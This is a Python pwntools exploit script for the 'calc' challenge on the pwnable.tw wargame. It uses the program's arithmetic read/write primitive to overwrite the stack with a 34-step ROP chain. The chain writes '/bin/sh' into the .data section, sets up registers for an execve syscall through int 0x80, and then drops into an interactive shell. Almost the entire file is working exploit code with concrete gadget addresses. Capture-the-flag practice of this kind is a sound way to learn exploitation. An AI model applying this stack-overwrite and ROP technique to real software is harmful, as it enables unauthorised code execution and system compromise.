from pwn import *


HOST = "chall.pwnable.tw"
PORT = 10100


def write_rop(conn, logger, offset, val):
    """
    This function uses offset as a word offset relative to the orignal return
    address ptr to allow the caller to create a ROP chain by writing val to
    these memory locations.
    """
    # The format string for using the write primitive.
    write_str = "+%d %s %d"
    # The format string for using the read primitive.
    read_str = "+%d"
    # This is the correct offset to where we want to write. Its relative to
    # the original return address ptr of the calc function.
    real_offset = 361 + offset

    # STEP 1: Read the current value in that memory location.
    read_str = read_str % (real_offset)
    conn.sendline(read_str)
    # STEP 2: Store this value as an integer.
    current_val = int(conn.recvline())
    # STEP 3: Calculate the difference between the new value and current
    # value.
    diff_val = val - current_val

    # STEP 4: If the new value is greater than our old value, we add the
    # difference, otherwise, we subtract the difference.
    if diff_val > 0:
        write_str = write_str % (real_offset, '+', diff_val)
    else:
        write_str = write_str % (real_offset, '', diff_val)

    # STEP 5: Write.
    conn.sendline(write_str)
    # STEP 6: Check if the write was successful.
    result = int(conn.recvline())

    if result == val:
        logger.status("Wrote %s to ret_ptr+%d." % (hex(val), offset*4))
    else:
        logger.failure("Could not write %d to ret_ptr+%d. Wrote %d instead" % \
            (hex(val), offset*4, hex(result)))
        log.failure("Exiting.")
        conn.close()
        exit(1)


def main():
    conn = remote(HOST, PORT)
    logger = log.progress("Creating ROP chain: ")
    conn.clean(0.2)

    write_rop(conn, logger, 0, 0x080701aa) # pop edx ; ret
    write_rop(conn, logger, 1, 0x080ec060) # @ .data
    write_rop(conn, logger, 2, 0x0805c34b) # pop eax ; ret
    write_rop(conn, logger, 3, u32("/bin"))
    write_rop(conn, logger, 4, 0x0809b30d) # mov dword ptr [edx], eax ; ret
    write_rop(conn, logger, 5, 0x080701aa) # pop edx ; ret
    write_rop(conn, logger, 6, 0x080ec064) # @ .data + 4
    write_rop(conn, logger, 7, 0x0805c34b) # pop eax ; ret
    write_rop(conn, logger, 8, u32("/sh\x00"))
    write_rop(conn, logger, 9, 0x0809b30d) # mov dword ptr [edx], eax ; ret
    write_rop(conn, logger, 10, 0x080701aa) # pop edx ; ret
    write_rop(conn, logger, 11, 0x080ec068) # @ .data + 8
    write_rop(conn, logger, 12, 0x080550d0) # xor eax, eax ; ret
    write_rop(conn, logger, 13, 0x0809b30d) # mov dword ptr [edx], eax ; ret
    write_rop(conn, logger, 14, 0x080481d1) # pop ebx ; ret
    write_rop(conn, logger, 15, 0x080ec060) # @ .data
    write_rop(conn, logger, 16, 0x080701d1) # pop ecx ; pop ebx ; ret
    write_rop(conn, logger, 17, 0x080ec068) # @ .data + 8
    write_rop(conn, logger, 18, 0x080ec060) # padding without overwrite ebx
    write_rop(conn, logger, 19, 0x080701aa) # pop edx ; ret
    write_rop(conn, logger, 20, 0x080ec068) # @ .data + 8
    write_rop(conn, logger, 21, 0x080550d0) # xor eax, eax ; ret
    write_rop(conn, logger, 22, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 23, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 24, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 25, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 26, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 27, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 28, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 29, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 30, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 31, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 32, 0x0807cb7f) # inc eax ; ret
    write_rop(conn, logger, 33, 0x08049a21) # int 0x80

    logger.success("OK")
    conn.sendline("BOMBS AWAY!")  # Cause return to follow ROP chain.

    conn.interactive()


if __name__ == "__main__":
    main()
